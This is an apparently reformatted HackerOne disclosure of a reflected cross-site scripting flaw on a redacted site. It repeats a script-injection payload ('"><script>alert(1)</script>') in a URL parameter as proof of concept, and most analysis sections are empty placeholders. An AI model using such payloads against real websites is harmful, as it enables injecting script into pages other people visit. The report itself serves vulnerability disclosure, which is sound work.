# Reflected XSS - https://███

## Metadata
- **Source:** HackerOne
- **Report:** 1260823 | https://hackerone.com/reports/1260823
- **Submitted:** 2021-07-13
- **Reporter:** fiveguyslover
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** medium
- **Vuln:** Cross-site Scripting (XSS) - Reflected
- **CVEs:** None
- **Category:** web-api

## Summary
Greetings, I just found an XSS vulnerability on a page of one of your websites

URL : 
https://████=%22%3E%3Cscript%3Ealert(1)%3C/script%3E

```
https://███="><script>alert(1)</script>
```
By the way, could you look at my "duplicated" report when it is not?
I don't mean any disrespect, but this is not the same page.
thank you - https://hackerone.com/reports/1260789

Best regards, 
fiveguyslover

#

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

Greetings, I just found an XSS vulnerability on a page of one of your websites

URL : 
https://████=%22%3E%3Cscript%3Ealert(1)%3C/script%3E

```
https://███="><script>alert(1)</script>
```
By the way, could you look at my "duplicated" report when it is not?
I don't mean any disrespect, but this is not the same page.
thank you - https://hackerone.com/reports/1260789

Best regards, 
fiveguyslover

## Impact

A reflected XSS vulnerability happens when the user input from a URL or POST data is reflected on the page without being stored, thus allowing the attacker to inject malicious content.

## System Host(s)
████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
URL : 
https://█████=%22%3E%3Cscript%3Ealert(1)%3C/script%3E
the alert will be displayed

## Suggested Mitigation/Remediation Actions




</details>

---
*Analysed by Claude on 2026-05-24*
